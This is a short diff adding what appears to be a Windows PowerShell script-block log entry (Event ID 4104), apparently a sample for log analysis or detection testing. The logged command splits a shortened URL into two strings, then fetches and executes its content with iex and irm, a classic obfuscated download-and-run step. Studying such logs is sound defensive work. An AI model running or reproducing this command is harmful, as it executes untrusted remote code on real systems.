@@ -1,0 +1,5 @@
+EventID: 4104
+Message: Creating Scriptblock text (1 of 1):
+$a='https://2n';$b='o.co/2OArm3';iex(irm ($a+$b))
+UserID: CORP\hr.user
+Path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
